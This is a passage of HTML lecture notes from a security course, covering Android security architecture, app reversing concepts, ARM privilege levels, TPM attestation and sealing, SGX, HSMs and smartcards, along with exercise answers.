<li>Play back the full images of all servers to get the machines working
with all applications as installed before the fire.</li>
<li>Use the database backups to populate the databases with the data
they contained before the disaster.</li>
<li>Restore the files of all the users.</li>
<li>Write a report of which parts of the recovery worked and which
didn’t. Adapt you backup strategy accordingly</li>
</ul>
<h2 id="mobile-security">Mobile security</h2>
<h3 id="mobile-security-motivation">Mobile security motivation</h3>
<p>Phone on 100% CPU capacity will be on for 10min. So everything needs
to be throttled.</p>
<p>A lot of sensors that are carrying personal data.</p>
<p>More exposed to local attackers (e.g. phone left at the bar)</p>
<p>Mobile computing is considered as one of the computing
revolutions</p>
<h3 id="attack-vectors">Attack vectors</h3>
<h4 id="types-of-malware-repackagring-look-alike-malware">Types of
malware: repackagring / look-alike Malware</h4>
<p>Download app from app market. Unpack and reverse endgineer app
(relatively easy on Android)</p>
<p>Modify and add code: add ads, require more permissions than original
app to steal user data, escalate privileges using exploits to deploy
ransomware …</p>
<p>Pack and publish modified version.</p>
<p>This is not a targetted attack, just broad attack.</p>
<h4 id="privacy-of-digital-content">Privacy of digital content</h4>
<p>Steal digital content from content providers. Platform needs to
support for secure audio and video playback, and premium content must
not leave the device.</p>
<p>Streaming services usually require platform with digital rights
management (DRM, e.g. Google Widevine or Microsoft PlayReady) to stream
premium content.</p>
<p>Why do we need DRMs on the system itself?</p>
<ul>
<li>the system is not trusted</li>
<li>to put watermarks on the stream (e.g. netflix id), since on the
server it would be very expensive on the server.</li>
</ul>
<h4 id="broader---political-instrument">Broader - Political
instrument</h4>
<p>there are companies that provide access to people’s phone’s</p>
<p>Usually these services, e.g. NSO, are sold to the CIAs, FBIs, other
agencies that, e.g. kill journalists</p>
<h3 id="android-vs-ios">Android vs iOS</h3>
<p>The biggest difference - <strong>openness</strong>.</p>
<h4 id="apples-ios-ecosystem-is-extremely-closed">Apple’s iOS ecosystem
is <strong>extremely closed</strong></h4>
<ul>
<li>iOS is a closed source</li>
<li>iOS and iOS apps can only run on Apple devices</li>
<li>you can install apps only from Apple Store (potential change due to
EU)</li>
<li>Tricky to “jailbreak” iOS devices</li>
</ul>
<p>How come they still are aroud?: they were first, and they make great
prodcuts and people know about it</p>
<h4 id="googles-strategy">Google’s strategy</h4>
<p>Even though they started earlier, they were late to market it.</p>
<p>Ecosystem is much more open:</p>
<ul>
<li>Android/AOSP is open source</li>
<li>Android can run on many different devices, even non-Google ones</li>
<li>easy to inspect Android apps/reverse/modify</li>
<li>Easy to install apps you develop (“side loading”)</li>
<li>developers can do many more things</li>
<li>quite easy to “jailbreak” Android devices</li>
</ul>
<p>Android is likely more secure as long as you keep updating
security</p>
<h3 id="arm---armv8">ARM - ARMv8</h3>
<h4 id="arm-processor-profiles">ARM processor profiles</h4>
<p>Cortex-A - full application (offers more features) Cortex-R -
real-time (industrial control, and tight scheduling bounds) Cortex-M -
embedded (small embedded chips, most IoT runs on this)</p>
<h4 id="arm-armv8-privilege-levels">ARM ARMv8 privilege levels</h4>
<table>
<colgroup>
<col style="width: 4%" />
<col style="width: 45%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th></th>
<th>Normal world (Rich Execution Env)</th>
<th>Secure World (Trusted Execution Env)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>EL0</td>
<td>Applications</td>
<td>Trusted applications</td>
</tr>
<tr class="even">
<td>EL1</td>
<td>Rich OS</td>
<td>Trusted OS</td>
</tr>
<tr class="odd">
<td>EL2</td>
<td>Hypervisor</td>
<td></td>
</tr>
<tr class="even">
<td>EL3</td>
<td>Secure Monitor</td>
<td>Secure Monitor</td>
</tr>
</tbody>
</table>
<p>x86: ring -2 - Firmware manager ring -1 - Hypervisor ring 0 - OS ring
1 - nothing (intended for drivers but they run at ring 0) ring 2 -
nothing (intended for drivers but they run at ring 0) ring 3 -
Applications</p>
<p>How does this relate to mobile device security: Rich OS - apps
Trusted OS - crypto, passwords, fingerprints, keys</p>
<h4 id="details-of-armv8-isa">Details of ARMv8 ISA</h4>
<p>To do computations you need to load and store first.</p>
<p>Instructions are 4 bytes, Load-store architecture, familiar concepts
- stack pointer, frame pointer (x29), function calls (bl), stack
frames…</p>
<p>QEMU allows to emulate other architectures.</p>
<p>to compile into ARM and to run it on x86</p>
<div class="sourceCode" id="cb14"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">aarch64-linux-gnu-gcc</span> <span class="at">-g</span> <span class="at">-O0</span> <span class="at">-fPIE</span> <span class="at">-pie</span> <span class="at">-o</span> main main.c</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-aarch64</span> <span class="at">-L</span> /usr/aarch64-linux-gnu/ main</span></code></pre></div>
<h3 id="android-ecosystem-and-security">Android ecosystem and
security</h3>
<h4 id="android-open-source-project-aosp">Android Open Source Project
(AOSP)</h4>
<p>Android is “<strong>owned</strong>” by Google, but code is made
availabe through AOSP.</p>
<p>OEM customizes code to their hw, adds proprietary components
(e.g. for hw support)</p>
<p>Google Mobile Services require OEM to comply with compatibility
definition document - provides this or other services, drivers, etc.</p>
<h4 id="chip---phone">Chip -&gt; phone</h4>
<p>ARM (ISA and design creator) -&gt; chip manufacturers (ODM - Original
design manufacturer) who pay ARM for licensing, and add their extensions
-&gt; phone (OEM -&gt; Original equipment manufacturer)</p>
<h4 id="open-in-aosp">“Open” in AOSP</h4>
<p>Q: “How does setting a PIN/pattern/password work?”</p>
<ol type="1">
<li>Determine component that implements feature</li>
<li>Figure out AOSP release</li>
<li>Look for component in AOSP</li>
<li>Read code until you are satisfied</li>
</ol>
<h4 id="not-so-open-in-aosp">“not-so-Open” in AOSP</h4>
<p>Enrolling and verifying passwords is a security-sensitive feature.
The backend of this feature is implemented by the <strong>Gatekeeper
subsystem</strong> The subsystem often uses trusted execution env (the
safe space) and is usually platform-dependent (~proprietary)</p>
<p>It guarantees stronger confidentiality</p>
<p>Throttles consecutive failed attempts</p>
<h4 id="android-devices">Android devices</h4>
<p>Many different players - many different hw OEMs</p>
<p>Many different Anfdroid versions:</p>
<ul>
<li>not all devices support all versions</li>
<li>some devices never get updated</li>
<li>most devices get updates only for 2/3 years</li>
<li>Android versions distribution secluded</li>
</ul>
<p>Regular Android app ships with 32-bit ARM, 64-bit ARM, and some
RISC5</p>
<h4 id="android-fragmentation">Android fragmentation</h4>
<p>Fragmentation is the <strong>biggest challenge</strong> for Android
security, since thousands of devices with custom hw and sw Customization
makes development and aptching tricky.</p>
<h4 id="lif-og-a-security-bug">Lif og a security bug</h4>
<p>Reporting:</p>
<ol type="1">
<li>Discovery: Security researcher (Google’s or external) finds a
bug</li>
<li>Disclosure: Report the bug to Google</li>
<li>Reception:
<ul>
<li>[ Hope the bug reaches the right Google employee ]</li>
<li>Google acknowledges the bug and will work on a fix</li>
</ul></li>
</ol>
<p>Fixing: Coordinated Disclosure [ Wait n days, industry standard: 90
days ] Publicly disclose the bug</p>
<p>Security patch distribution Google distributes the patches to other
manufactures Patch is published as part of the Monthly Security
Bulletin</p>
<h4 id="perils-of-customization">Perils of customization</h4>
<p>Google sends patch to third-party company X: Company X now needs to
apply the patch to their custom AOSP fork</p>
<p><strong>Project treble</strong></p>
<p>Previously: no clear interface between Android OS framework and
vendor implementation So when Android OS is updated - vendors lose time
integrating the new patches and this introduces new costs and overheads
and delays</p>
<p>Project Treble helps defining a clear interface Note: this is useful
for non-security patches as well</p>
<p>Introduced with Android 8.0+</p>
<h4 id="most-devices-dont-get-security-patches">Most devices don;t get
security patches</h4>
<p>only 2/3 years of updates because vendors are not interested in
supporting old devices.</p>
<h4 id="role-of-security-researchers">Role of Security researchers</h4>
<p>Identify malware</p>
<ul>
<li>Once a new malware is found, it’s added to blacklists</li>
<li>Any app “similar” to the malware will be flagged and removed</li>
</ul>
<p>Security vulnerabilities</p>
<ul>
<li>Once they are found, they are reported to Google</li>
<li>Monetary rewards for security bugs: “Bug Bounties”</li>
</ul>
<h4 id="attacker-goals-vs-security-researchers">Attacker goals vs
security researchers</h4>
<p>Security researchers want to</p>
<ul>
<li>Identify malware (add to disallow-lists, flag apps “similar enough”
to listed malware apps)</li>
<li>Report security vulnerabilities for bug bounties</li>
</ul>
<p>Attackers want to in general: run code on your device and do XYZ</p>
<p>Two main important topics:</p>
<ul>
<li>Malware analysis, detection, containment</li>
<li>Vulnerability analysis, detection, prevention, patching</li>
</ul>
<h3 id="android-apps">Android Apps</h3>
<p>written in Java, C/C++, Kotlin, Rust, …</p>
<p>Android apps “live” in the Android context: Android framework exposes
a gigantic number of APIs APIs somewhat equivalent to “library
functions”</p>
<p>APIs are useful for:</p>
<ul>
<li>apps to interact with the “external world” (via the API)</li>
<li>the Android framework to interact with the Android app, e.g., where
does the execution start?</li>
<li>to extend Java SDK APIs: Many APIs from the Java world are part of
the Android APIs</li>
</ul>
<p>APIs examples: HTTP request, Log message, access to GPS/location
info</p>
<p><strong>Android Framework APIs</strong> - too many to be
enumerated</p>
<p><strong>Package name</strong> - each app has a package name</p>
<h4 id="basics-on-android-apps">Basics on Android apps</h4>
<p>there is no “main” function</p>
<p>The user interacts via the Graphical UI - UI widgeds (EditText,
Button), no CLI</p>
<p>Many APIs are “event-driven” - register a listener X and X’s callback
is invoked later on</p>
<p>Apps are build on combination of “components”</p>
<h4 id="component-types">4 Component types</h4>
<h5 id="activity">Activity</h5>
<p>Entry point for interacting with the user, and it represents a single
screen with UI.</p>
<p>You can have many - each defines a UI You can define which is the
main/start one If app allows it, an external app can start these
activities at will</p>
<h5 id="service">Service</h5>
<p>Meant to perform an action in the background for some period of time,
regardless of what the user is doing in foreground (the user could be
switching between activities)</p>
<p>Services don’t provide UI.</p>
<p>e.g. music player service</p>
<h5 id="broadcast-receiver">Broadcast receiver</h5>
<p>Respond to system-wide events Have well-defined entry point System
can deliver these events even to apps that are currently not running</p>
<p>Events example: battery charging, SMS is received</p>
<h5 id="content-provider">Content provider</h5>
<p>Manage a shared set of app data High-level API to access data so that
other apps and services can query/interact with it They abstract away
the storing mechanism</p>
<p>Most often based on SQLit database (file-based)</p>
<h5 id="communication-between-components---intents">Communication
between components - intents</h5>
<p>Android-defined objects that encode an “intent” (fancy IPC
message)</p>
<p>Use cases:</p>
<ul>
<li>notation “A.X” refers to A’s component X</li>
<li>A.X wants to start A.Y (e.g. go to next activity)</li>
<li>A.X wants to send data to B.Z</li>
<li>user clicks on A’s icon -&gt; laucher app sends intent to A.MA</li>
<li>note - each component has a life cycle - A.Y could already be
started</li>
</ul>
<h4 id="manifest-file">Manifest file</h4>
<p>Most important file of Android app</p>
<p>Specifies all key information needed by the fw to run the app:</p>
<ul>
<li>Package name</li>
<li>Components app consists of</li>
<li>Intent filters</li>
<li>Main Activity ~&gt; main() entrypoint</li>
<li>Permissions</li>
</ul>
<h3 id="app-security">App security</h3>
<p>Android is based on Linux</p>
<p>Each app has its own Linux user ID (there are ways to setp apps so
that they share the user ID)</p>
<p>Each app lives in its own security sandbox - standard Linux process
isolation, restricted file system permissions</p>
<h4 id="app-installation">App installation</h4>
<p>Android fw creates a new Linux user with a new user ID*</p>
<p>each app is given a private dir - also call internal storage, where
no other app can access it (unless it is with shared user ID)</p>
<h4 id="android-framework-architecture">Android Framework
Architecture</h4>
<p>User-space is app, android fw, native libraries, android runtime, HAL
(audio, bt, camera)</p>
<p>Kernel space - Linux kernel (drivers, power management)</p>
<p>Between them there is a security boundary.</p>
<p>Instrumentation and analysis at these abstraction levels can be
bypassed</p>
<p><strong>Pros</strong> - syscall analysis CANNOT be bypassed (because
of the security boundary) <strong>Cons</strong> - bridging the semantics
gap is complicated</p>
<p><strong>*Manager</strong> (LocationManager, TelephonyManager,
PackageManager, ActivityManager)- lives on App and Android Framework
levels. They run as “privileged” users.</p>
<h5 id="asking-the-os-for-favors-aka-syscalls">asking the OS for favors,
aka syscalls</h5>
<p>Traditional OSes have two worlds - user-space vs kernel-space</p>
<p>user-space is where user processes and apps live - they can’t do much
by themselves</p>
<p>kernel-space is where the actual OS lives - the OS is the god of
machine and information</p>
<h5 id="example---getlastlocation">Example - getLastLocation()</h5>
<p>App invokes Android API:
<code>LocationManager.getLastLocation()</code> We are still within the
app’s sandbox!</p>
<p>Actual implementation of the privileged API:
<code>LocationManagerService.getLastLocation()</code> We are in a
“privileged” service</p>
<p>To go to other side we need something</p>
<h4 id="crossing-the-bridge">Crossing the bridge</h4>
<p>Binder - one of the main Android’s “extensions” over Linux It allows
for <em>Remote Procedure Call (RPC)</em> and <em>Inter-Process
Communication (IPC)</em></p>
<h5 id="binder-rpc">Binder RPC</h5>
<p>App that is run as non-privileged process sends Binder message over
Binder “Proxy” -&gt; Binder Driver, Linux Kernel -&gt; Binder “Stub”
-&gt; service that is privileged process/service</p>
<h5 id="binder-details">Binder Details</h5>
<p>Proxy and Stub are automatically generated starting from AIDL</p>
<p>Binder communication: perform ioctl syscall on /dev/binder</p>
<p>ioctl syscall:</p>
<ul>
<li>Multi-purpose syscall, to talk to drivers</li>
<li>In the Binder context: kernel driver takes care of it, dispatches
messages and returns replies</li>
</ul>
<p>There is a lot of overhead in context switching to kernel, switch to
service context, get caches, get data, switch to the app. This works if
the Binder calls are infrequent</p>
<h4 id="androind-permission-system">Androind permission system</h4>
<p>Manifest encodes what app wants.</p>
<p>Each of these “protects” security-sensitive capabilities:</p>
<ul>
<li>ability to “do” something sensitive - open Internet connection, send
SMS</li>
<li>ability to “access” sensitive information, e.g. location, user,
contacts,…</li>
</ul>
<p>More and more malware is moving to getting SMS permissions because of
the 2FA</p>
<p><strong>READ/WRITE_EXTERNAL_STORAGE</strong> - even though each app
has access to a private dir, by default no other apps can access this
dir. Device offers an “external storage” - in the past physical
“removable” SD card (because it had to have vFAT). Currently part of the
file system that apps can use to share files, or “/sdcard” - where your
photos and downloaded files are</p>
<h3 id="reversing-android-apps">Reversing Android Apps</h3>
<h4 id="compilation">Compilation</h4>
<p>Java/Kotlin compiler to Java bytecode (executable by the JVM) then
DEX compiler to Dalvik bytecode (executable by the DVM) (whereas C/C++
compiles straight to machine code)</p>
<p>Java comes with copywrite and copywrite issues, so Google didn’t want
to be sued by Oracle anymore</p>
<h4 id="android-application-package-apk">Android Application Package
(APK)</h4>
<p>APK is a zip file</p>
<p>Content:</p>
<ul>
<li>AndroidManifest.xml (compressed)</li>
<li>classes.dex (raw Dalvik bytecode)</li>
<li>resources.arsc (compressed)</li>
<li>res/*.xml (compressed)</li>
</ul>
<h4 id="big-picture">Big picture</h4>
<p>from this zip file, you can unpack the individual components,
libraries that are shipped.</p>
<p>You can disassemble DEX files, go from Dalvik bytecode to smali file
type.</p>
<p>apktool can embed baksmal/smali it unpacks/packs APKs, including
resources and manifest files</p>
<h4 id="disassemble-vs-decompilation">Disassemble vs decompilation</h4>
<p>Disassembly - binary file -&gt; DAlvik bytecode “smali”
representation</p>
<p>Decompilation - assembly/bytecode to source code-level representation
(Dalvik bytecode -&gt; Java code) However obfuscation can make this
difficult</p>
<p>Decompilation tools: JEB (commercial, VERY expensive) BytecodeViewer
(pretty good one) Jadx NEW: Ghidra, open source tool developed by
NSA</p>
<h3 id="kernel-security-and-selinux">Kernel security and SELinux</h3>
<p>User-based permission model - each app has userID</p>
<p>Process isolation - applications are separate</p>
<p>Extensible mechanism for secure IPC</p>
<h4 id="application-sandbox">Application sandbox</h4>
<p>apps are isolated from each other. Sandbox is in the kernel, native
code can’t bypass it</p>
<p>To bypass the sandbox, an attacker would need to compromise linux</p>
<h4 id="defense-in-depth">defense in depth</h4>
<p>multiple layers of security controls throughout a system it prevents
single vulns from leading to compromise of the OS</p>
<blockquote>
<p>redundacy</p>
</blockquote>
<h4 id="selinux">SELinux</h4>
<p>Security-Enhanced Linux: a Linux kernel security module</p>
<ul>
<li>Useful to define access control security policies</li>
<li>Example: allow/prevent execution of syscall X</li>
</ul>
<p>Prevents execution of system call.</p>
<p>“Deny by default” policy</p>
<p>Two modes:</p>
<ul>
<li>Permissive mode: permissions denials are logged but
<strong>NOT</strong> enforced</li>
<li>Enforcing mode: permission denials are logged <strong>AND</strong>
enforced (in Android is this one)</li>
</ul>
<p>“SELinux domain”:</p>
<ul>
<li>a label identifying a process (one or more)</li>
<li>all processes labeled with the same domain are treated equal (allow
different processes (FB and FB messenger) to exchange data)</li>
</ul>
<p>current version has 60+ domains (early version - installd, netd,
vold, and zygote)</p>
<p>Kernel enforces strict set of permissions for each application.
Application can only communicate with the manager only if the permission
was granted before -&gt; manager does not have to implement security
checks</p>
<p>90-95% of research is done on Android security, because iOS is
closed-source</p>
<h2 id="exercises-9">Exercises 9</h2>
<p><strong>Exercise 1</strong> Identify three examples to convince this
guest that the software stack on his phone is only partially open
source.</p>
<ol type="1">
<li>The platform-dependent parts for a given hardware platform need to
be added to the AOSP to make it run on a given chipset. These
platform-dependent parts are usually not opensourced.</li>
<li>OEMs usually heavily modify the AOSP to create a unique user
experience on their platform, hoping to get a competitive advantage.
Many components of Samsung’s “One UI” are not open-sourced.</li>
<li>The software/firmware running in the TEE, wifi chip, Bluetooth chip,
and baseband chip is not open-sourced.</li>
</ol>
<p><strong>Exercise 2</strong> Let us say you want to implement an image
parser in a C/C++ native library to gain more performance and have a
better user experience. When loading images directly from the web in
your app that uses this library, what could go wrong?</p>
<p>• If there are bugs in this native library, the app might crash,
resulting in a bad user experience. • In the worst case, this bug might
lead to code execution in the context of your app, given a specifically
attacker-crafted image.</p>
<p><strong>Exercise 3</strong> Explain to the developer what a
republishing scheme is and why it is possible on Android.</p>
<ol type="1">
<li>In a republishing scheme, malware authors download an existing app
from an app store, reverse engineer it, and add malicious code to it.
They publish this stolen app via app stores to follow their nefarious
intentions.</li>
<li>For example, one way to make money for the malware author is by
adding ads to the stolen app.</li>
<li>It is possible to reverse engineer Android apps because the code is
delivered in an intermediate representation (Dalvik bytecode) that
contains most of the original type information. The Dalvik bytecode can,
thus, be translated back to a human-readable assembly representation
(e.g., smali) or even to the source code (e.g., Java).</li>
</ol>
<p><strong>Exercise 4</strong> Since you actually read (parts) of the
research articles published with these prototypes, you chime in and
explain that a CPU emulator alone is not enough to run these components.
Come up with an argument to convince the security researcher.</p>
<p>PartEmu and FirmWire need to implement all the peripherals (e.g.,
memory-mapped input/output) the TEE OS or the baseband firmware,
respectively, are interacting with. These peripherals are private, and
it requires a lot of reverse-engineering effort to implement an
emulation layer that works sufficiently accurate.</p>
<h2 id="trusted-computing">Trusted Computing</h2>
<p>Why trust a computer? If you want to compute something, you may have
to trust some other party (hw/sw)</p>
<h3 id="confidential-computing">Confidential computing</h3>
<p>Hardware and/or software techniques ensure your program runs without
disclosing its secrets Not assurance that your code runs to completion
(adversary may deny service)</p>
<p>It ensures correctness but not liveness</p>
<p>It gives the confidentiality and integrity, but does not give
availability? This is because there can be other components that are not
trusted (other processes, attacker could turn off the computer)</p>
<p>In cloud, the platform provider must retain control over scheduling
-&gt; availability may suffer.</p>
<p>Confidential computing implies higher overhead. And usually you
optimize to use only the trusted core component.</p>
<h3 id="what-if-we-can-trust-the-hardware">What if we can trust the
hardware</h3>
<p>Assume we can.</p>
<p>Build a trusted core of the application and put it in the safe
hardware, then nobody else can look inside or extract secrets. We can
ensure that the hardware runs correctly with cryptographic
primitives.</p>
<h4 id="properties-of-trusted-hardware">Properties of trusted
hardware</h4>
<ul>
<li>Attestation - hardware proves that it odes what you think it is
doing</li>
<li>Sealing - hardware stores secrets in unprotected memory</li>
<li>Isolation - privileged and concurrent code cannot observe
computation (this included protection against side-channel attacks)</li>
</ul>
<p>Examples of trusted hardware: IntelSGX is storing data as encrypted
to the memory, and cache is unexcrypted. It assumes that chip cannot be
broken/read out the cache or individual CPU pins.</p>
<p>Examples of uses of trusted hardware</p>
<h3 id="trusted-hardware">Trusted hardware</h3>
<p>Any hardware that has been certified to perform <em>according to a
certain set of requirements under strong adversarial conditions</em></p>
<p>Because of the strong adversarial conditions, trusted hardware is
often (but not always) <em>tamper resistant</em></p>
<p>Integrated Trusted Hardware - Intel SGX, TPM chip</p>
<p>Trusted Hardware with physical isolation - Hardware security module -
half-size server that you can put to server rack and they will do all
the magic by if you open it, it destroys the data, Smart card (bank
card, sim card, ID, camipro, keys, SwissPass, Insurance card)</p>
<p>Tamper resistance up to a given attacker</p>
<h4 id="trusted-execution-environments-tee">Trusted execution
environments (TEE)</h4>
<p>isolated processing environment in which applications can be securely
executed irrespective of the rest of the “system”</p>
<p><strong>dedicated devices</strong></p>
<ul>
<li>strong physical protections</li>
<li>protect against invasive adversaries</li>
<li>limited functionality, often optimized for cryptographic
operations</li>
<li>act as root of trust for larger operations. e.g. support to secure
boot of OS</li>
</ul>
<p><strong>Secure enclaves in shared devices</strong></p>
<ul>
<li>protected regions of memory</li>
<li>confidentiality and integrity of running processes</li>
<li>verification of executable code before execution</li>
<li>enable processes to run while being protected from attacks
perpetrated by the OS, hypervisor, firmware, drivers or remote
attackers</li>
</ul>
<p>Intel tried to make money by adding a secure component on a chip,
therefore hiding information from OS or hypervisor. ARM Trustzone does
similar to IntelSJX</p>
<p>TEE guarantees the environment in which code is being run</p>
<h4 id="trusted-platform-module-tpm">Trusted Platform Module (TPM)</h4>
<p>Microcontroller atteched to bus or somewhere in the system can
securely store artifacts such as keys or passwords, used to authenticate
the platform. It can sign, encrypt data or verify hash.</p>
<p>It can also provide and store measurements to ensure that the
platform stays trustworthy.</p>
<p>TPM gives the guarantee for the state and you can build a chain of
trust.</p>
<p>Example: TPM guards sensitive data in non-volatile storage</p>
<ol type="1">
<li>Endorsement Key (EK) (2048bit RSA)
<ol type="1">
<li>created at manufacturing time, signed by manufacturer,
immutable</li>
<li>used for attestation</li>
</ol></li>
<li>Storage Root Key (SRK) (2048bit RSA)
<ol type="1">
<li>used for encrypted storage (sealing) - created after running
TPM_TakeOwnership</li>
<li>Can be cleared later with TPM_ForceClear from BIOS</li>
</ol></li>
<li>OwnerPassword (160bits) and persistent flags
<ol type="1">
<li>EK, SRK, OwnerPwd are private and never leave the TPM</li>
</ol></li>
</ol>
<p>It provides Platfrom Configuration Registers (PCR) which hold state
(for checking) many per chip (&gt;16), they contain 32-byte SHA-256
digest PCRs are initialized at boot time to default value</p>
<p>They have two relevant operations: TPM_extend(n,D): PCR[n] &lt;-
SHA256(PCR[n] || D) &lt;—- take existing value, and stream in data from
D, continuously updating SHA sum TPM_PCRRead(n): returns PCR[n]</p>
<p>It can be used for attestation, sealing, and isolation</p>
<h5 id="tpm-attestation">TPM Attestation</h5>
<p>Mechanism that allows a hardware module to prove that it is in a
specific state to an authorized party</p>
<p>Attest there is secure hardware : EK serves to prove the device is
genuine (verify this by pubkey from device manufacturer – trusting
Intel, or others that the key management is correct) Attest the state of
OS : after a series of instructions, the state of registers is as
expected (part of the secure boot) Attest the state of the code :
signature of the code (piping the code through the secure register)</p>
<p>Examples of possible use cases:</p>
<ul>
<li>bank allows money transfer if customer’s machine runs “up-to-date”
OS patches</li>
<li>Enterprise allows laptop to connect to its network only if laptop
runs “authorized” software</li>
<li>gamers can join network only if their game client is unmodified</li>
</ul>
<p>Example: Game consoles, company laptops, and mobile phones &lt;–
places where secure boot is used to verify the OS and that information
was not stolen</p>
<p><strong>Secure Boot:</strong> On power-up TPM gets TPM_Initsignal
from LPC bus</p>
<ol type="1">
<li>BIOS boot block
<ol type="1">
<li>TPM_Startup to initialized PCRs to 0</li>
<li>PCR_Extend(n, &lt;bios code&gt;)</li>
<li>then loads, checks, and runs BIOS post-boot code</li>
</ol></li>
<li>BIOS:
<ol type="1">
<li>Calls PCR_Extend(n, &lt;MBR (master boot record) code&gt;)</li>
<li>Then loads, checks and runs MBR</li>
</ol></li>
<li>MBR (master boot record):
<ol type="1">
<li>calls PCR_Extend(…)</li>
<li>Then loads, checks and runs OS loader, etc.</li>
</ol></li>
</ol>
<p>Going beyond OS is hard because a lot of apps are running
concurrently, so it cannot verify the state of the data. So then you
give the parts of code to TPM to get the hash to verify that the code
has not been tampered with.</p>
<p>After full boot sequence, PCR contains hash chain of the booted
software. Hash ensures no cheating.</p>
<p><strong>Software attestation</strong></p>
<p>Goal prove to server that application is untampered</p>
<p>First step - create Attestation Identity Key (AIK)</p>
<ul>
<li>private key only known to TPM</li>
<li>pubkey certified by an Authority if EK is valid</li>
<li>can be certified using EK directly or privately (Direct anonymous
attestation)</li>
</ul>
<p>Server sends attestation request (PCRList, Nonce) Application goes to
TPM to get Attestation = PCR state and signature, and sends to server,
and establishes TLS channel Server validates signature and PCR state and
communicates on secure channel</p>
<p>This way the server can verify the application by checking individual
bits and pieces of the application’s memory</p>
<p><strong>EXAMPLE - private contact discovery in Signal</strong> Signal
is a messaging application Signal has end-to-end encryption, keys
astored on the device, (mostly) open source, independent</p>
<p>They have private contact discovery: from list of contacts find the
intersections who from those contacts is using signal.</p>
<p>Solutions: give contact list to signal and it returs the users list
(unsafe) or get all contacts from signal and intersect with your
contacts list. (this would be 1.5TB of data)</p>
<p><strong>Privacy</strong>: Even if we trust signal, we don’t want
Signal to know who we are communicating to</p>
<p>We cannot do <em>acccess control</em>, because Signal would need to
have access control to signal servers, but it is the threat model</p>
<p>We cannot do <em>cryptography</em> because signal then would still
know. We could do <em>Private Set Intersection</em>, which is crypto
primitive, where the intersections is received back by the user. Problem
is that PSI does not scale</p>
<p><em>Intel SGX solution</em> - do the intersection computation in an
enclave: signal sends pubkey of enclave user encrypts contact list with
pubkey signal computes the intersection then the intersection is sent
back</p>
<p>We are still trusting Signal that they are running the enclave.
Enclave is open source and the user can compute (and check) the hash
used in attestation.</p>
<p>Application verifies the state by sending a challenge to signal
enclave. Then the enclave returns the pubkey with attestation. Then
continues the contact exchange.</p>
<p>We still need to trust Intel to faithfully implement SGX, and that it
does not screw up the enclave, and that it is sufficiently hard to break
into the enclave.</p>
<h5 id="tpm-sealing">TPM Sealing</h5>
<p><strong>Sealed storage</strong> protects private information by
binding it to platform configuration information including the software
and hardware being used</p>
<p>The device derives a key that is tied to its current status,
e.g. Platform Configuration Registers (PCRs) and stores the encrypted
data</p>
<p>Data can only be decrypted by a device with the <strong>same</strong>
status (same hw, sw, same state)</p>
<p>Setup:</p>
<ol type="1">
<li>Run TPM_TakeOwnership(OwnerPassword …) Creates 2048bit RSA Storage
Root Key (SRK) on TPM Cannot run TPM_TakeOwnership again without
OwnerPassword Done once by IT department or laptop owner (optional)</li>
<li>Run TPM_CreateWrapKey/TPM_LoadKey Create more RSA keys on TPM
protected by SRK (identified by 32-bit keyhandle)</li>
</ol>
<p>Storing data:</p>
<ol type="1">
<li>TPM_Seal(keyhandle, PCRValues, Data) Encrypts data using key
[keyhandle] data up to 256 bits (e.g. an AES key)</li>
<li>Securely store encrypted data in persistent memory</li>
</ol>
<p>Recovering data</p>
<ol type="1">
<li>Recover data from secure storage</li>
<li>Decrypt with TPM_Unseal() Will only succeed if PCRValues are the
same as twhen TPM_Seal was run (so changing MBR, OS Kernel, os App code
means that data cannot be decrypted)</li>
</ol>
<p>Signal does the same thing to store the snapshot of the SGX
enclave.</p>
<p>Another example - Windows Bitlocker which purpose is to encrypt a
full volume The Volume Master Key (VMK), that encrypts disk volume key,
can be recovered only if you boot up with the correct state of the
system</p>
<p>They do not solve all security issues - because they have their own
issues, trade-offs (limited throughput, limited storage) Intel SGX has a
memory limit because you need to hash the data streams, otherwise there
could be a replay attacks done.</p>
<h4 id="trusted-hardware-key-properties---isolation">Trusted Hardware
Key Properties - Isolation</h4>
<p>Mechanism to constrain who and what has access to programs and
data</p>
<p>Trusted hardware offers <em>one well-identified entry-point</em> to
interact with software</p>
<ul>
<li>tamper resistance - hard to open</li>
<li>tamper evident - you can see if it has been opened</li>
<li>tamper responsive - delete keys when attacked</li>
<li>resistance to side-channel attacks and physical probing</li>
</ul>
<h4 id="hardware-secure-modules-hsms">Hardware Secure Modules
(HSMs)</h4>
<p>Hardened, tamper-resistant hw devices</p>
<p>Cryptography oriented: generating keys, encrypting and decrypting
data, and creating and verifying digital signatures</p>
<p>Certified at vairous FIPS 140-2 (federal information processing
standard) levels: approved security algorithms achieve evidence of
tampering (e.g. coatings and seals) that must be broken to attain
physical access to the plaintext crypto keys and critical security
parameters</p>
<p>There is an API defined by PKCS</p>
<h5 id="use-case-secure-iphone-backups">Use-case: secure iPhone
backups</h5>
<p>we want users to be able to vackup their data to the cloud, and the
user should be the only one that can recover their data</p>
<p>We don’t trust other users, cloud provider, Apple, external
paries</p>
<p>User should retain exclusive access</p>
<p>Solution: access control; problem - apple and the cloud can still
access the HSM; Even if Apple and cloud were trusted, access control for
data just prevents other users and 3rd parties from accessing the data
and this does not apply to 3rd parties with subpoenas</p>
<p>Solution: cryptography - key is on the phone. Encrypt the data, and
send it to the cloud. If the phone is lost, the data is lost.</p>
<p>Solution: password that is sufficiently hard used to derive the key
Problem - guessing the password. So limit the attempts, but people don’t
really remmeber long passwords</p>
<p>HSM Pubkey is hardcoded into the device:</p>
<ol type="1">
<li>Generate random symkey k</li>
<li>encrypt phone data using k, and send it to the cloud</li>
<li>send key k to the HSM, encrypted with pubkey (there is user password
and k)</li>
</ol>
<p>After the login to iCloud, passcode is sent ot HSM and which retrieve
the key k</p>
<p>These HSMs run custom software. This software can be updated. To
update, there are protect access keys - Apple’s HSMs require smartcards
to update, stored in sealed and tamper-evident bags while not used.
Install software, destroy access cards</p>
<p>Still need to trust Apple to install secure software in the first
place</p>
<h4 id="smartcards">Smartcards</h4>
<p>Plastic card with embedded integratecircuits which can process data
and are often tamper resistant</p>
<p>Two types:</p>
<ul>
<li>memory cards</li>
<li>microprocessor cards</li>
</ul>
<p>Contain keys and certificates - authentication / digital signatures,
confidentiality, key management protocols</p>
